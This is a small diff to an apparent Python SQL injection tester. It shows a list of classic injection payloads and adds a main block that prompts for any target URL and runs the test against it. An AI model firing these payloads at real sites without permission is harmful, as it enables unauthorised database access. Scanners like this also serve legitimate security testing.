@@ -66,3 +66,6 @@ sql_payloads = [
         "' OR 'x'='x",
         "' AND (SELECT COUNT(*) FROM users) > 0 -- "
     ]
+if __name__ == "__main__":
+    target_url = input("Enter the target url : ")
+    test_sql_injection(target_url, sql_payloads)
